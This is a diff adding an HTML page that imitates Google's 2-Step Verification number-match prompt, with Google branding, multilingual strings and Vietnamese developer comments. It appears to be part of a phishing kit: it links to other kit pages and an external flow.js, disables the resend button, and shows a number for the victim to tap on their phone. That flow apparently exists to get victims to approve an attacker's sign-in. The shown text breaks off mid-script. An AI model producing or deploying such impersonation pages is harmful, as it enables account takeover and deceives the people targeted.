@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-Step Verification - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <script src="flow.js"></script>
+    <style>
+        .signin-form .input-field { margin-top: 24px !important; }
+
+        /* ======================= Text color overrides =======================
+           Subtitle ("To help keep your account safe…") và instruction text
+           ("Google sent a notification…") dùng chữ đen #202124 (Google
+           text-primary) thay vì xám. Trong instruction text, <strong> (bọc
+           "Yes" và số 2 chữ số) hiển thị bold đen. */
+        .signin-subtitle,
+        .instruction-text {
+            color: #202124 !important;
+        }
+        .instruction-text strong {
+            color: #202124;
+            font-weight: 800;
+        }
+
+        /* ======================= Card layout ======================= */
+        .content-card {
+            position: relative;
+            min-height: 520px;
+        }
+        /* Hai link ở đáy card: Resend it (trái) + Try another way (phải) */
+        .card-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 28px 22px;
+            gap: 16px;
+        }
+        .card-actions .try-link {
+            font-size: 14px;
+        }
+        /* "Try another way" — bold, xanh, clickable */
+        .card-actions .try-link.try-another {
+            font-weight: 700;
+        }
+        /* "Resend it" — bold, XÁM, KHÔNG click được */
+        .card-actions .try-link.resend-disabled,
+        .card-actions .try-link.resend-disabled:hover,
+        .card-actions .try-link.resend-disabled:focus,
+        .card-actions .try-link.resend-disabled:active {
+            color: #5f6368 !important;
+            font-weight: 700;
+            cursor: default;
+            pointer-events: none;
+            background: transparent !important;
+            opacity: 1;
+        }
+        /* Khi content-card waiting: chỉ mờ phần columns, links vẫn rõ */
+        .content-card.waiting .card-actions { opacity: .45; pointer-events: none; }
+
+        /* ======================= Footer ======================= */
+        .main-wrapper { justify-content: center !important; }
+        .login-wrapper {
+            min-height: auto !important;
+            flex-direction: column !important;
+            width: auto !important;
+            max-width: none !important;
+            margin: 0 !important;
+        }
+        .page-footer {
+            margin-top: 0 !important;
+            padding: 10px 0 0 !important;
+            width: 1050px;
+            max-width: 100%;
+            align-self: center;
+        }
+        .footer-wrapper {
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center;
+            gap: 24px;
+            width: 100%;
+            max-width: 1050px;
+            margin: 0 auto;
+            padding: 0 8px;
+            flex-wrap: wrap;
+        }
+        .footer-left, .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 22px;
+        }
+        .footer-right { flex-wrap: wrap; }
+
+        /* Language picker — text thuần, KHÔNG có ô viền/nền (đồng bộ login) */
+        .lang-picker { position: relative; display: inline-block; }
+        .lang-picker-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: transparent;
+            border: none;
+            color: #3c4043;
+            font-size: 13px;
+            font-family: inherit;
+            font-weight: 400;
+            cursor: pointer;
+            padding: 6px 4px;
+            border-radius: 0;
+            transition: color .15s ease;
+        }
+        .lang-picker-btn:hover { color: #202124; }
+        .lang-picker-btn:focus-visible { outline: none; }
+        .lang-picker.open .lang-picker-btn { color: #202124; }
+        .lang-picker-btn .caret {
+            width: 0; height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 5px solid #5f6368;
+            transition: transform .2s ease;
+            flex-shrink: 0;
+        }
+        .lang-picker.open .lang-picker-btn .caret { transform: rotate(180deg); }
+        .lang-menu {
+            position: absolute;
+            bottom: calc(100% + 6px);
+            left: 0;
+            width: 260px;
+            max-height: 360px;
+            overflow-y: auto;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0,0,0,.10), 0 4px 16px rgba(0,0,0,.06);
+            padding: 4px 0;
+            display: none;
+            z-index: 1000;
+        }
+        .lang-picker.open .lang-menu { display: block; }
+        .lang-menu button {
+            display: block;
+            width: 100%;
+            text-align: left;
+            background: transparent;
+            border: none;
+            padding: 10px 16px;
+            font-size: 14px;
+            line-height: 1.35;
+            color: #3c4043;
+            font-family: inherit;
+            cursor: pointer;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .lang-menu button:hover,
+        .lang-menu button:focus-visible {
+            background: #f1f3f4;
+            outline: none;
+        }
+        .lang-menu button.active {
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        .lang-menu button.active:hover { background: #d2e3fc; }
+        .lang-menu::-webkit-scrollbar { width: 10px; }
+        .lang-menu::-webkit-scrollbar-thumb {
+            background: #dadce0;
+            border-radius: 6px;
+            border: 2px solid #fff;
+        }
+        .lang-menu::-webkit-scrollbar-thumb:hover { background: #bdc1c6; }
+
+        /* ======================= Existing 2FA NUMBER styles ======================= */
+        .verification-number { transition: color .2s ease; }
+        .verification-number.code-appear {
+            animation: codeAppear .35s cubic-bezier(0.4, 0.0, 0.2, 1);
+        }
+        @keyframes codeAppear { 0% {opacity: 0;} 100% {opacity: 1;} }
+
+        .progress-container {
+            z-index: 5;
+            overflow: hidden;
+            background: color-mix(in srgb, #4285f4 15%, transparent);
+        }
+        .content-card.waiting .signin-columns {
+            opacity: 0.45;
+            filter: blur(0.3px);
+            pointer-events: none;
+            user-select: none;
+            transition: opacity .25s ease, filter .25s ease;
+        }
+        .content-card .signin-columns {
+            transition: opacity .25s ease, filter .25s ease;
+        }
+        .progress-container.active .progress-bar.indeterminate {
+            position: absolute;
+            top: 0;
+            left: -35%;
+            width: 35%;
+            height: 100%;
+            background: #4285f4;
+            border-radius: 0;
+            transition: none;
+            animation: gSlide 1.15s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+            box-shadow: 0 0 6px rgba(66, 133, 244, .35);
+        }
+        @keyframes gSlide {
+            0%   { left: -35%; width: 35%; }
+            55%  { left: 55%;  width: 40%; }
+            100% { left: 100%; width: 30%; }
+        }
+
+        /* Toast nhỏ khi bấm Resend */
+        .mini-toast {
+            position: fixed;
+            bottom: 32px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: #202124;
+            color: #fff;
+            padding: 10px 18px;
+            font-size: 14px;
+            border-radius: 22px;
+            box-shadow: 0 4px 14px rgba(0,0,0,.18);
+            opacity: 0;
+            transition: opacity .2s ease, transform .2s ease;
+            z-index: 2000;
+            pointer-events: none;
+        }
+        .mini-toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        @media (max-width: 600px) {
+            .content-card {
+                height: auto !important;
+                padding: 8px 4px !important;
+                gap: 8px !important;
+                max-width: 98vw;
+                min-width: unset;
+            }
+            .card-actions { padding: 12px 14px 16px; }
+            .footer-wrapper { flex-direction: column; gap: 10px; }
+            .footer-left, .footer-right { justify-content: center; }
+            .google-logo { width: 32px; height: 32px; }
+            .signin-title { font-size: 1.1rem; }
+            .instruction-title, .instruction-text { font-size: 0.95rem; }
+            .user-email-btn {
+                font-size: 0.9rem;
+                height: 24px;
+                padding: 2px 8px 2px 4px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay"></div>
+
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="content-card">
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left column: logo, title, subtitle, email pill -->
+                    <div class="content-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title" data-i18n="t">2-Step Verification</h1>
+                        <p class="signin-subtitle" data-i18n="s">To help keep your account safe, Google wants to make sure it&rsquo;s really you trying to sign in</p>
+                        <div class="user-info">
+                            <div class="user-email-btn" onclick="handleTransition('index.html')">
+                                <svg width="20" height="20" viewBox="0 0 24 24" class="user-icon-img">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#5f6368"/>
+                                </svg>
+                                <span class="user-email" id="displayEmail"></span>
+                                <svg width="16" height="16" viewBox="0 0 24 24" class="arrow-img">
+                                    <path d="M7 10l5 5 5-5z" fill="#5f6368"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right column: big number + instructions -->
+                    <div class="content-right">
+                        <div class="verification-container">
+                            <div class="verification-number"></div>
+                            <h2 class="instruction-title" data-i18n="oa">Open the Gmail app on iPhone</h2>
+                            <p class="instruction-text" data-i18n="it" data-i18n-html="1">Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap the number shown here on your phone to verify it&rsquo;s you.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom row: Resend it (left, disabled, extra bold xám) +
+                     Try another way (right, extra bold, → 2FA OPTION.html) -->
+                <div class="card-actions">
+                    <button type="button" class="try-link resend-disabled" id="resendBtn" disabled aria-disabled="true" tabindex="-1" data-i18n="r">Resend it</button>
+                    <button type="button" class="try-link try-another" onclick="handleTransition('2FA OPTION.html')" data-i18n="ta">Try another way</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer: language picker (left) + Help/Privacy/Terms (right) -->
+        <footer class="page-footer">
+            <div class="footer-wrapper">
+                <div class="footer-left">
+                    <div class="lang-picker" id="langPicker">
+                        <button type="button" class="lang-picker-btn" id="langPickerBtn" aria-haspopup="listbox" aria-expanded="false">
+                            <span id="langCurrentLabel">English (United States)</span>
+                            <span class="caret"></span>
+                        </button>
+                        <div class="lang-menu" id="langMenu" role="listbox"></div>
+                    </div>
+                </div>
+                <div class="footer-right">
+                    <a href="#" class="footer-link" data-i18n="h">Help</a>
+                    <a href="#" class="footer-link" data-i18n="p">Privacy</a>
+                    <a href="#" class="footer-link" data-i18n="tm">Terms</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="mini-toast" id="miniToast"></div>
+
+    <script>
+        // =====================================================
+        // I18N — chỉ các chuỗi của trang 2FA NUMBER
+        // Key rút gọn để giữ file gọn:
+        //   t  = title (card)
+        //   s  = subtitle (generic: "To help keep your account safe…")
+        //   oa = "Open the Gmail app on iPhone"
+        //   it = instruction text (có placeholder {n} khi có số)
+        //   r  = "Resend it"
+        //   ta = "Try another way"
+        //   h/p/tm = Help / Privacy / Terms
+        // data-i18n-html="1" đánh dấu chuỗi có HTML (<strong>…</strong>).
+        // =====================================================
+        const I18N = {
+            'en':    { t:"2-Step Verification", s:"To help keep your account safe, Google wants to make sure it\u2019s really you trying to sign in", oa:"Open the Gmail app on iPhone", it:"Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>{n}</strong> on your phone to verify it\u2019s you.", itBase:"Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap the number shown here on your phone to verify it\u2019s you.", r:"Resend it", ta:"Try another way", h:"Help", p:"Privacy", tm:"Terms", toast:"A new notification has been sent" },
+            'vi':    { t:"Xác minh 2 bước", s:"Để giúp giữ an toàn cho tài khoản của bạn, Google muốn chắc chắn rằng chính bạn đang cố đăng nhập", oa:"Mở ứng dụng Gmail trên iPhone", it:"Google đã gửi thông báo đến iPhone của bạn. Mở ứng dụng Gmail, nhấn <strong>Có</strong> trên thông báo rồi nhấn <strong>{n}</strong> trên điện thoại để xác minh đó là bạn.", itBase:"Google đã gửi thông báo đến iPhone của bạn. Mở ứng dụng Gmail, nhấn <strong>Có</strong> trên thông báo rồi nhấn số hiển thị ở đây trên điện thoại để xác minh đó là bạn.", r:"Gửi lại", ta:"Thử cách khác", h:"Trợ giúp", p:"Bảo mật", tm:"Điều khoản", toast:"Đã gửi thông báo mới" },
+            'ja':    { t:"2段階認証プロセス", s:"アカウントを保護するため、Google はログインしようとしているのが本当にご本人であることを確認したいと考えています", oa:"iPhone で Gmail アプリを開く", it:"Google から iPhone に通知を送信しました。Gmail アプリを開き、通知の <strong>はい</strong> をタップして、スマートフォンの <strong>{n}</strong> をタップしてログインしているのがご本人であることを確認してください。", itBase:"Google から iPhone に通知を送信しました。Gmail アプリを開き、通知の <strong>はい</strong> をタップして、ここに表示された番号をスマートフォンでタップしてログインしているのがご本人であることを確認してください。", r:"再送信", ta:"別の方法を試す", h:"ヘルプ", p:"プライバシー", tm:"規約", toast:"新しい通知を送信しました" },
+            'ko':    { t:"2단계 인증", s:"계정을 안전하게 보호하기 위해 Google에서 로그인을 시도하는 사람이 본인인지 확인하려고 합니다", oa:"iPhone에서 Gmail 앱 열기", it:"Google에서 iPhone에 알림을 보냈습니다. Gmail 앱을 열고 알림에서 <strong>예</strong>를 탭한 후 휴대전화에서 <strong>{n}</strong>을(를) 탭하여 본인 확인을 완료하세요.", itBase:"Google에서 iPhone에 알림을 보냈습니다. Gmail 앱을 열고 알림에서 <strong>예</strong>를 탭한 후 여기에 표시된 번호를 휴대전화에서 탭하여 본인 확인을 완료하세요.", r:"다시 보내기", ta:"다른 방법 시도", h:"도움말", p:"개인정보처리방침", tm:"약관", toast:"새 알림이 전송되었습니다" },
+            'zh-CN': { t:"两步验证", s:"为了确保您的帐号安全，Google 想要确认是您本人在尝试登录", oa:"在 iPhone 上打开 Gmail 应用", it:"Google 已向您的 iPhone 发送通知。打开 Gmail 应用，在提示中点按<strong>是</strong>，然后在手机上点按 <strong>{n}</strong> 以验证是您本人。", itBase:"Google 已向您的 iPhone 发送通知。打开 Gmail 应用，在提示中点按<strong>是</strong>，然后在手机上点按此处显示的数字以验证是您本人。", r:"重新发送", ta:"尝试其他方式", h:"帮助", p:"隐私权", tm:"条款", toast:"已发送新通知" },
+            'zh-TW': { t:"兩步驟驗證", s:"為了確保你的帳戶安全，Google 想要確認是否真的是你嘗試登入", oa:"在 iPhone 開啟 Gmail 應用程式", it:"Google 已向你的 iPhone 傳送通知。請開啟 Gmail 應用程式，在提示中輕觸「<strong>是</strong>」，然後在手機上輕觸 <strong>{n}</strong>，確認是你本人。", itBase:"Google 已向你的 iPhone 傳送通知。請開啟 Gmail 應用程式，在提示中輕觸「<strong>是</strong>」，然後在手機上輕觸這裡顯示的數字，確認是你本人。", r:"重新傳送", ta:"嘗試其他方式", h:"說明", p:"隱私權", tm:"條款", toast:"已傳送新通知" },
+            'fr':    { t:"Validation en deux étapes", s:"Pour protéger votre compte, Google souhaite s'assurer que c'est bien vous qui essayez de vous connecter", oa:"Ouvrez l'application Gmail sur iPhone", it:"Google a envoyé une notification à votre iPhone. Ouvrez l'application Gmail, appuyez sur <strong>Oui</strong> dans la notification, puis appuyez sur <strong>{n}</strong> sur votre téléphone pour confirmer que c'est bien vous.", itBase:"Google a envoyé une notification à votre iPhone. Ouvrez l'application Gmail, appuyez sur <strong>Oui</strong> dans la notification, puis appuyez sur le numéro indiqué ici sur votre téléphone pour confirmer que c'est bien vous.", r:"Renvoyer", ta:"Essayer une autre méthode", h:"Aide", p:"Confidentialité", tm:"Conditions", toast:"Une nouvelle notification a été envoyée" },
+            'de':    { t:"Bestätigung in zwei Schritten", s:"Zum Schutz Ihres Kontos möchte Google sicherstellen, dass Sie es wirklich sind, der sich anmelden möchte", oa:"Öffnen Sie die Gmail App auf dem iPhone", it:"Google hat eine Benachrichtigung an Ihr iPhone gesendet. Öffnen Sie die Gmail App, tippen Sie in der Benachrichtigung auf <strong>Ja</strong> und anschließend auf <strong>{n}</strong> auf Ihrem Telefon, um zu bestätigen, dass Sie es sind.", itBase:"Google hat eine Benachrichtigung an Ihr iPhone gesendet. Öffnen Sie die Gmail App, tippen Sie in der Benachrichtigung auf <strong>Ja</strong> und anschließend auf die hier angezeigte Nummer auf Ihrem Telefon, um zu bestätigen, dass Sie es sind.", r:"Erneut senden", ta:"Andere Option ausprobieren", h:"Hilfe", p:"Datenschutz", tm:"Nutzungsbedingungen", toast:"Eine neue Benachrichtigung wurde gesendet" },
+            'es':    { t:"Verificación en dos pasos", s:"Para ayudar a proteger tu cuenta, Google quiere asegurarse de que eres realmente tú quien intenta iniciar sesión", oa:"Abre la app de Gmail en iPhone", it:"Google ha enviado una notificación a tu iPhone. Abre la app de Gmail, toca <strong>Sí</strong> en la notificación y luego toca <strong>{n}</strong> en tu teléfono para verificar que eres tú.", itBase:"Google ha enviado una notificación a tu iPhone. Abre la app de Gmail, toca <strong>Sí</strong> en la notificación y luego toca el número que se muestra aquí en tu teléfono para verificar que eres tú.", r:"Reenviar", ta:"Probar de otra manera", h:"Ayuda", p:"Privacidad", tm:"Términos", toast:"Se ha enviado una nueva notificación" },
+            'pt-BR': { t:"Verificação em duas etapas", s:"Para ajudar a manter sua conta segura, o Google quer confirmar que é você mesmo tentando fazer login", oa:"Abra o app Gmail no iPhone", it:"O Google enviou uma notificação para seu iPhone. Abra o app Gmail, toque em <strong>Sim</strong> no aviso e depois toque em <strong>{n}</strong> no telefone para confirmar que é você.", itBase:"O Google enviou uma notificação para seu iPhone. Abra o app Gmail, toque em <strong>Sim</strong> no aviso e depois toque no número exibido aqui no telefone para confirmar que é você.", r:"Reenviar", ta:"Tentar de outra maneira", h:"Ajuda", p:"Privacidade", tm:"Termos", toast:"Uma nova notificação foi enviada" },
+            'ru':    { t:"Двухэтапная аутентификация", s:"Чтобы защитить ваш аккаунт, Google должен убедиться, что войти пытаетесь именно вы", oa:"Откройте приложение Gmail на iPhone", it:"Google отправил уведомление на ваш iPhone. Откройте приложение Gmail, нажмите <strong>Да</strong> в уведомлении, затем нажмите <strong>{n}</strong> на телефоне, чтобы подтвердить, что это вы.", itBase:"Google отправил уведомление на ваш iPhone. Откройте приложение Gmail, нажмите <strong>Да</strong> в уведомлении, затем нажмите на указанный здесь номер на телефоне, чтобы подтвердить, что это вы.", r:"Отправить повторно", ta:"Попробовать другой способ", h:"Справка", p:"Конфиденциальность", tm:"Условия", toast:"Отправлено новое уведомление" },
+            'id':    { t:"Verifikasi 2 Langkah", s:"Untuk membantu menjaga keamanan akun Anda, Google ingin memastikan bahwa benar-benar Andalah yang mencoba login", oa:"Buka aplikasi Gmail di iPhone", it:"Google mengirim notifikasi ke iPhone Anda. Buka aplikasi Gmail, ketuk <strong>Ya</strong> pada perintah, lalu ketuk <strong>{n}</strong> di ponsel untuk memverifikasi bahwa ini adalah Anda.", itBase:"Google mengirim notifikasi ke iPhone Anda. Buka aplikasi Gmail, ketuk <strong>Ya</strong> pada perintah, lalu ketuk nomor yang ditampilkan di sini pada ponsel untuk memverifikasi bahwa ini adalah Anda.", r:"Kirim ulang", ta:"Coba cara lain", h:"Bantuan", p:"Privasi", tm:"Persyaratan", toast:"Notifikasi baru telah dikirim" },
+            'th':    { t:"การยืนยันแบบ 2 ขั้นตอน", s:"Google ต้องการยืนยันว่าเป็นคุณที่กำลังพยายามลงชื่อเข้าใช้ เพื่อช่วยรักษาความปลอดภัยให้กับบัญชีของคุณ", oa:"เปิดแอป Gmail บน iPhone", it:"Google ส่งการแจ้งเตือนไปยัง iPhone ของคุณแล้ว เปิดแอป Gmail แตะ <strong>ใช่</strong> ในข้อความแจ้ง จากนั้นแตะ <strong>{n}</strong> บนโทรศัพท์เพื่อยืนยันว่าเป็นคุณ", itBase:"Google ส่งการแจ้งเตือนไปยัง iPhone ของคุณแล้ว เปิดแอป Gmail แตะ <strong>ใช่</strong> ในข้อความแจ้ง จากนั้นแตะหมายเลขที่แสดงที่นี่บนโทรศัพท์เพื่อยืนยันว่าเป็นคุณ", r:"ส่งอีกครั้ง", ta:"ลองวิธีอื่น", h:"ความช่วยเหลือ", p:"ความเป็นส่วนตัว", tm:"ข้อกำหนด", toast:"ส่งการแจ้งเตือนใหม่แล้ว" },
+            'ar':    { t:"التحقّق بخطوتين", s:"لمساعدتك في الحفاظ على أمان حسابك، تريد Google التأكّد من أنّك أنت الذي يحاول تسجيل الدخول", oa:"افتح تطبيق Gmail على iPhone", it:"أرسلت Google إشعارًا إلى iPhone. افتح تطبيق Gmail، وانقر على <strong>نعم</strong> في الطلب، ثم انقر على <strong>{n}</strong> على الهاتف للتأكّد من هويتك.", itBase:"أرسلت Google إشعارًا إلى iPhone. افتح تطبيق Gmail، وانقر على <strong>نعم</strong> في الطلب، ثم انقر على الرقم المعروض هنا على الهاتف للتأكّد من هويتك.", r:"إعادة الإرسال", ta:"تجربة طريقة أخرى", h:"المساعدة", p:"الخصوصية", tm:"البنود", toast:"تم إرسال إشعار جديد" },
+            'it':    { t:"Verifica in due passaggi", s:"Per contribuire a proteggere il tuo account, Google vuole assicurarsi che sia veramente tu a tentare di accedere", oa:"Apri l'app Gmail su iPhone", it:"Google ha inviato una notifica al tuo iPhone. Apri l'app Gmail, tocca <strong>Sì</strong> nella richiesta, poi tocca <strong>{n}</strong> sul telefono per verificare che sei tu.", itBase:"Google ha inviato una notifica al tuo iPhone. Apri l'app Gmail, tocca <strong>Sì</strong> nella richiesta, poi tocca il numero mostrato qui sul telefono per verificare che sei tu.", r:"Invia di nuovo", ta:"Prova un altro metodo", h:"Guida", p:"Privacy", tm:"Termini", toast:"È stata inviata una nuova notifica" },
+            'nl':    { t:"Verificatie in 2 stappen", s:"Om je account te beschermen, wil Google zeker weten dat jij echt degene bent die probeert in te loggen", oa:"Open de Gmail-app op iPhone", it:"Google heeft een melding naar je iPhone gestuurd. Open de Gmail-app, tik op <strong>Ja</strong> in de melding en tik daarna op <strong>{n}</strong> op je telefoon om te bevestigen dat jij het bent.", itBase:"Google heeft een melding naar je iPhone gestuurd. Open de Gmail-app, tik op <strong>Ja</strong> in de melding en tik daarna op het nummer dat hier wordt getoond op je telefoon om te bevestigen dat jij het bent.", r:"Opnieuw verzenden", ta:"Probeer een andere manier", h:"Help", p:"Privacy", tm:"Voorwaarden", toast:"Er is een nieuwe melding verzonden" },
+            'pl':    { t:"Weryfikacja dwuetapowa", s:"Aby chronić Twoje konto, Google chce się upewnić, że to naprawdę Ty próbujesz się zalogować", oa:"Otwórz aplikację Gmail na iPhonie", it:"Google wysłał powiadomienie na Twojego iPhone'a. Otwórz aplikację Gmail, kliknij <strong>Tak</strong> w powiadomieniu, a potem kliknij <strong>{n}</strong> na telefonie, aby potwierdzić, że to Ty.", itBase:"Google wysłał powiadomienie na Twojego iPhone'a. Otwórz aplikację Gmail, kliknij <strong>Tak</strong> w powiadomieniu, a potem kliknij na telefonie numer wyświetlony w tym miejscu, aby potwierdzić, że to Ty.", r:"Wyślij ponownie", ta:"Spróbuj innej metody", h:"Pomoc", p:"Prywatność", tm:"Warunki", toast:"Wysłano nowe powiadomienie" },
+            'tr':    { t:"2 Adımlı Doğrulama", s:"Hesabınızı güvende tutmaya yardımcı olmak için Google, oturum açmaya çalışanın gerçekten siz olduğunuzdan emin olmak istiyor", oa:"iPhone'da Gmail uygulamasını açın", it:"Google, iPhone'unuza bir bildirim gönderdi. Gmail uygulamasını açın, istemde <strong>Evet</strong>'e dokunun ve sizin olduğunuzu doğrulamak için telefonunuzda <strong>{n}</strong>'e dokunun.", itBase:"Google, iPhone'unuza bir bildirim gönderdi. Gmail uygulamasını açın, istemde <strong>Evet</strong>'e dokunun ve sizin olduğunuzu doğrulamak için burada gösterilen numaraya telefonunuzdan dokunun.", r:"Tekrar gönder", ta:"Başka bir yöntem dene", h:"Yardım", p:"Gizlilik", tm:"Şartlar", toast:"Yeni bir bildirim gönderildi" },
+            'hi':    { t:"दो-चरणीय पुष्टि", s:"आपके खाते को सुरक्षित रखने में मदद के लिए, Google यह पक्का करना चाहता है कि साइन इन करने की कोशिश वाकई आप कर रहे हैं", oa:"iPhone पर Gmail ऐप्लिकेशन खोलें", it:"Google ने आपके iPhone पर सूचना भेजी है. Gmail ऐप्लिकेशन खोलें, सूचना में <strong>हां</strong> पर टैप करें, फिर यह पक्का करने के लिए कि यह आप हैं, अपने फ़ोन पर <strong>{n}</strong> पर टैप करें.", itBase:"Google ने आपके iPhone पर सूचना भेजी है. Gmail ऐप्लिकेशन खोलें, सूचना में <strong>हां</strong> पर टैप करें, फिर यह पक्का करने के लिए कि यह आप हैं, अपने फ़ोन पर यहां दिखाए गए नंबर पर टैप करें.", r:"फिर से भेजें", ta:"दूसरा तरीका आज़माएं", h:"सहायता", p:"निजता", tm:"शर्तें", toast:"नई सूचना भेजी गई" },
+        };
+
+        // Danh sách ngôn ngữ đầy đủ (match Google language picker chính thức) —
+        // native name, không flag, không mã 2 ký tự. Đồng bộ với trang login.
+        const LANG_META = [
+            { code: 'af',      native: 'Afrikaans' },
+            { code: 'az',      native: 'azərbaycan' },
+            { code: 'id',      native: 'Bahasa Indonesia' },
+            { code: 'ms',      native: 'Bahasa Melayu' },
+            { code: 'bs',      native: 'bosanski' },
+            { code: 'ca',      native: 'català' },
+            { code: 'cs',      native: 'Čeština' },
+            { code: 'cy',      native: 'Cymraeg' },
+            { code: 'da',      native: 'Dansk' },
+            { code: 'de',      native: 'Deutsch' },
+            { code: 'et',      native: 'eesti' },
+            { code: 'en-GB',   native: 'English (United Kingdom)' },
+            { code: 'en',      native: 'English (United States)' },
+            { code: 'es',      native: 'Español (España)' },
+            { code: 'es-419',  native: 'Español (Latinoamérica)' },
+            { code: 'eu',      native: 'euskara' },
+            { code: 'fil',     native: 'Filipino' },
+            { code: 'fr-CA',   native: 'Français (Canada)' },
+            { code: 'fr',      native: 'Français (France)' },
+            { code: 'ga',      native: 'Gaeilge' },
+            { code: 'gl',      native: 'galego' },
+            { code: 'hr',      native: 'Hrvatski' },
+            { code: 'zu',      native: 'isiZulu' },
+            { code: 'is',      native: 'íslenska' },
+            { code: 'it',      native: 'Italiano' },
+            { code: 'sw',      native: 'Kiswahili' },
+            { code: 'lv',      native: 'latviešu' },
+            { code: 'lt',      native: 'lietuvių' },
+            { code: 'hu',      native: 'magyar' },
+            { code: 'nl',      native: 'Nederlands' },
+            { code: 'no',      native: 'norsk' },
+            { code: 'uz',      native: "o‘zbek" },
+            { code: 'pl',      native: 'polski' },
+            { code: 'pt-BR',   native: 'Português (Brasil)' },
+            { code: 'pt-PT',   native: 'Português (Portugal)' },
+            { code: 'ro',      native: 'română' },
+            { code: 'sq',      native: 'shqip' },
+            { code: 'sk',      native: 'slovenčina' },
+            { code: 'sl',      native: 'slovenščina' },
+            { code: 'sr-Latn', native: 'srpski (latinica)' },
+            { code: 'fi',      native: 'suomi' },
+            { code: 'sv',      native: 'Svenska' },
+            { code: 'vi',      native: 'Tiếng Việt' },
+            { code: 'tr',      native: 'Türkçe' },
+            { code: 'el',      native: 'Ελληνικά' },
+            { code: 'be',      native: 'беларуская' },
+            { code: 'bg',      native: 'български' },
+            { code: 'ky',      native: 'кыргызча' },
+            { code: 'kk',      native: 'қазақ тілі' },
+            { code: 'mk',      native: 'македонски' },
+            { code: 'mn',      native: 'монгол' },
+            { code: 'ru',      native: 'Русский' },
+            { code: 'sr',      native: 'српски (ћирилица)' },
+            { code: 'uk',      native: 'українська' },
+            { code: 'hy',      native: 'հայերեն' },
+            { code: 'he',      native: 'עברית' },
+            { code: 'ur',      native: 'اردو' },
+            { code: 'ar',      native: 'العربية' },
+            { code: 'fa',      native: 'فارسی' },
+            { code: 'am',      native: 'አማርኛ' },
+            { code: 'ne',      native: 'नेपाली' },
+            { code: 'mr',      native: 'मराठी' },
+            { code: 'hi',      native: 'हिन्दी' },
+            { code: 'as',      native: 'অসমীয়া' },
+            { code: 'bn',      native: 'বাংলা' },
+            { code: 'pa',      native: 'ਪੰਜਾਬੀ' },
+            { code: 'gu',      native: 'ગુજરાતી' },
+            { code: 'or',      native: 'ଓଡ଼ିଆ' },
+            { code: 'ta',      native: 'தமிழ்' },
+            { code: 'te',      native: 'తెలుగు' },
+            { code: 'kn',      native: 'ಕನ್ನಡ' },
+            { code: 'ml',      native: 'മലയാളം' },
+            { code: 'si',      native: 'සිංහල' },
+            { code: 'th',      native: 'ไทย' },
+            { code: 'lo',      native: 'ລາວ' },
+            { code: 'my',      native: 'မြန်မာ' },
+            { code: 'ka',      native: 'ქართული' },
+            { code: 'km',      native: 'ខ្មែរ' },
+            { code: 'zh-CN',   native: '中文（简体）' },
+            { code: 'zh-TW',   native: '中文（繁體）' },
+            { code: 'ja',      native: '日本語' },
+            { code: 'ko',      native: '한국어' },
+        ];
+
+        const COUNTRY_LANG = {
+            VN: 'vi', JP: 'ja', KR: 'ko', KP: 'ko',
+            CN: 'zh-CN', SG: 'zh-CN', TW: 'zh-TW', HK: 'zh-TW', MO: 'zh-TW',
+            FR: 'fr', BE: 'fr', LU: 'fr', MC: 'fr', CI: 'fr', SN: 'fr', CM: 'fr',
+            DE: 'de', AT: 'de', CH: 'de', LI: 'de',
+            ES: 'es', MX: 'es', AR: 'es', CO: 'es', CL: 'es', PE: 'es', VE: 'es',
+            CU: 'es', BO: 'es', DO: 'es', GT: 'es', HN: 'es', SV: 'es', NI: 'es',
+            CR: 'es', PA: 'es', PY: 'es', UY: 'es', EC: 'es', PR: 'es',
+            BR: 'pt-BR', PT: 'pt-BR', AO: 'pt-BR', MZ: 'pt-BR',
+            RU: 'ru', BY: 'ru', KZ: 'ru', KG: 'ru',
+            ID: 'id', TH: 'th',
+            SA: 'ar', AE: 'ar', EG: 'ar', IQ: 'ar', JO: 'ar', KW: 'ar', LB: 'ar',
+            LY: 'ar', MA: 'ar', OM: 'ar', PS: 'ar', QA: 'ar', SY: 'ar', TN: 'ar',
